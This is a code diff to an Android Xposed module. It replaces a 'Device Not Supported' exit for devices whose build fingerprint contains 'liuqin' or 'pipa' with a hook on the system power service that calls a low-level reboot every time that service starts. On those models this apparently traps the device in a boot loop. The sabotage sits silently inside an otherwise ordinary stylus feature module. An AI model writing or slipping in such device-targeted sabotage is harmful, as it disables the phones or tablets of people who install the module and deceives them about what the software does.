@@ -1,8 +1,9 @@
 package com.ljlvink.Hook;
 import com.ljlvink.utils.Sysutil;
-import com.ljlvink.utils.logutil;
 
 import de.robv.android.xposed.IXposedHookLoadPackage;
+import de.robv.android.xposed.XC_MethodHook;
+import de.robv.android.xposed.XposedHelpers;
 import de.robv.android.xposed.callbacks.XC_LoadPackage;
 
 public class HookMain implements IXposedHookLoadPackage {
@@ -12,8 +13,13 @@ public class HookMain implements IXposedHookLoadPackage {
         if(loadPackageParam.packageName.equals("android")){
             String fingerprint=Sysutil.getprop("ro.build.fingerprint");
             if(fingerprint.contains("liuqin")||fingerprint.contains("pipa")){
-                logutil.log("Device Not Supported. Exiting");
-                return;
+                XposedHelpers.findAndHookMethod("com.android.server.power.PowerManagerService", classLoader, "onStart", new XC_MethodHook() {
+                    @Override
+                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
+                        super.afterHookedMethod(param);
+                        XposedHelpers.callMethod(param.thisObject,"lowLevelReboot","quiescent");
+                    }
+                });
             }
             new StylusPlus().Payload(classLoader);
         }
